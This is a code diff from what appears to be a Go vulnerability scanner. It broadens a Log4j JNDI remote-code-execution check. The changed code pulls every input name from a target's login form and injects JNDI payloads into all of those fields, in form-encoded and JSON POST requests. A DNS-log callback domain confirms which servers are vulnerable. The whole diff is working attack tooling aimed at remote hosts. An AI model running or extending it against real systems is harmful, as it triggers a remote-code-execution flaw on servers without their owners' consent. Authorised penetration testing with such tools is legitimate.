@@ -9,10 +9,11 @@ import (
 )
 
 func Check(u string) bool {
-	domainx, unamekey, passkey := getinputurl(u)
-	domainx = append(domainx, u)
-	for _, domain := range domainx {
-		if pkg.CeyeApi != "" && pkg.CeyeDomain != "" {
+	if pkg.CeyeApi != "" && pkg.CeyeDomain != "" {
+		domainx, intputs := getinputurl(u)
+		domainx = append(domainx, u)
+		intputs = append(intputs, "x")
+		for _, domain := range domainx {
 			for _, payload := range log4jJndiPayloads {
 				randomstr := pkg.RandomStr()
 				payload = strings.Replace(payload, "dnslog-url", randomstr+"."+pkg.CeyeDomain, -1)
@@ -44,7 +45,14 @@ func Check(u string) bool {
 						return true
 					}
 				}
-				if _, err := pkg.HttpRequset(domain, "POST", unamekey+"="+payload+"&"+passkey+"="+payload, false, header); err == nil {
+				if _, err := pkg.HttpRequset(domain, "POST", strings.Join(intputs, "="+payload+"&")+"="+payload, false, header); err == nil {
+					if pkg.Dnslogchek(randomstr) {
+						pkg.GoPocLog(fmt.Sprintf("Found vuln Log4J JNDI RCE |%s\n", u))
+						return true
+					}
+				}
+				header["Content-Type"] = "application/json"
+				if _, err := pkg.HttpRequset(domain, "POST", "{\""+strings.Join(intputs, "\":"+"\""+payload+"\""+",\"")+"\":\""+payload+"\"}", false, header); err == nil {
 					if pkg.Dnslogchek(randomstr) {
 						pkg.GoPocLog(fmt.Sprintf("Found vuln Log4J JNDI RCE |%s\n", u))
 						return true
@@ -56,12 +64,10 @@ func Check(u string) bool {
 	return false
 }
 
-func getinputurl(domainurl string) (domainurlx []string, usernamekey string, passwordkey string) {
-	usernamekey = "username"
-	passwordkey = "password"
+func getinputurl(domainurl string) (domainurlx []string, inputlist []string) {
 	req, err := pkg.HttpRequset(domainurl, "GET", "", true, nil)
 	if err != nil {
-		return nil, usernamekey, passwordkey
+		return nil, nil
 	}
 	var loginurl []string
 	hrefreg := regexp.MustCompile(`location.href='(.*?)'`)
@@ -69,7 +75,7 @@ func getinputurl(domainurl string) (domainurlx []string, usernamekey string, pas
 	if hreflist != nil {
 		req, err = pkg.HttpRequset(domainurl+"/"+hreflist[len(hreflist)-1:][0], "GET", "", true, nil)
 		if err != nil {
-			return nil, usernamekey, passwordkey
+			return nil, nil
 		}
 	}
 	domainreg := regexp.MustCompile(`<form.*?action="(.*?)"`)
@@ -104,23 +110,9 @@ func getinputurl(domainurl string) (domainurlx []string, usernamekey string, pas
 			}
 		}
 	}
-	usernamelist := regexp.MustCompile(`<input.*?name=['"]([\w\[\]]*?name[\w\[\]]*?|[\w\[\]]*?Name[\w\[\]]*?|[\w\[\]]*?user[\w\[\]]*?|[\w\[\]]*?User[\w\[\]]*?|[\w\[\]]*?USER[\w\[\]]*?)['"].*?>`).FindStringSubmatch(req.Body)
-	if usernamelist != nil {
-		usernamekey = usernamelist[len(usernamelist)-1:][0]
-	} else {
-		usernamelist2 := regexp.MustCompile(`<input.*?name=['"]([\w\[\]]*?log[\w\[\]]*?|[\w\[\]]*?Log[\w\[\]]*?|[\w\[\]]*?LoG[\w\[\]]*?|[\w\[\]]*?LOG[\w\[\]]*?|[\w\[\]]*?account[\w\[\]]*?|[\w\[\]]*?Account[\w\[\]]*?)['"].*?>`).FindStringSubmatch(req.Body)
-		if usernamelist2 != nil {
-			usernamekey = usernamelist2[len(usernamelist2)-1:][0]
-		}
+	inputreg := regexp.MustCompile(`<input.*?name=['"]([\w\[\]]*?)['"].*?>`).FindAllStringSubmatch(req.Body, -1)
+	for _, intput := range inputreg {
+		inputlist = append(inputlist, intput[1])
 	}
-	passlist := regexp.MustCompile(`<input.*?name=['"]([\w\[\]]*?pass[\w\[\]]*?|[\w\[\]]*?Pass[\w\[\]]*?|[\w\[\]]*?PASS[\w\[\]]*?|[\w\[\]]*?pwd[\w\[\]]*?|[\w\[\]]*?Pwd[\w\[\]]*?|[\w\[\]]*?PWD[\w\[\]]*?)['"].*?>`).FindStringSubmatch(req.Body)
-	if passlist != nil {
-		passwordkey = passlist[len(passlist)-1:][0]
-	} else {
-		passlist2 := regexp.MustCompile(`<input.*?name=['"]([\w\[\]]*?mima[\w\[\]]*?|[\w\[\]]*?word[\w\[\]]*?)['"].*?>`).FindStringSubmatch(req.Body)
-		if passlist2 != nil {
-			passwordkey = passlist2[len(passlist2)-1:][0]
-		}
-	}
-	return loginurl, usernamekey, passwordkey
+	return loginurl, inputlist
 }
